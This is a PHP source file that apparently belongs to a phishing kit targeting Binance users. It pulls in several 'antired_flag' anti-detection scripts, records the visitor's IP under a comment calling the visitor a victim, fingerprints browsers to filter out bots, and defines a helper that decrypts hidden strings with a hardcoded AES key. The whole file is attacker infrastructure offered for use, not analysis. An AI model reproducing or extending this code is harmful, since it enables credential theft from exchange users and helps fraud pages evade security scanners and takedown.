<?php
		include "../antired_flag/anti1.php";
		include "../antired_flag/anti2.php"; 
		include "../antired_flag/anti3.php"; 
		include "../antired_flag/anti4.php"; 
		include "../antired_flag/anti5.php"; 
		include "../antired_flag/anti7.php";
function getUserIP()
{
	if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
			  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
			  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	}
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote  = $_SERVER['REMOTE_ADDR'];

	if(filter_var($client, FILTER_VALIDATE_IP))
	{
		$ip = $client;
	}
	elseif(filter_var($forward, FILTER_VALIDATE_IP))
	{
		$ip = $forward;
	}
	else
	{
		$ip = $remote;
	} 
	return $ip;
}
function p($e){
	$ed = base64_decode($e);
	$n = openssl_decrypt(
		"$ed",
		"AES-256-CBC",
		"7711567891011121",
		0,
		"1234567891011121");
	return $n;
}

function getBrowser() {
    global $user_agent;
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/Mozilla/i'	=>	'Mozila',
        '/Mozilla/5.0/i'=>	'Mozila',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/edge/i'       =>  'Edge',
        '/opera/i'      =>  'Opera',
        '/OPR/i'        =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/Bot/i'		=>	'Spam',
        '/Valve Steam GameOverlay/i'  =>  'Steam',
        '/mobile/i'     =>  'Phone'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$tab = "";
$ip = getUserIP();  // get ip from vic
$str=rand();
$khawazmia_binance = md5($str);
// diro nia 
?>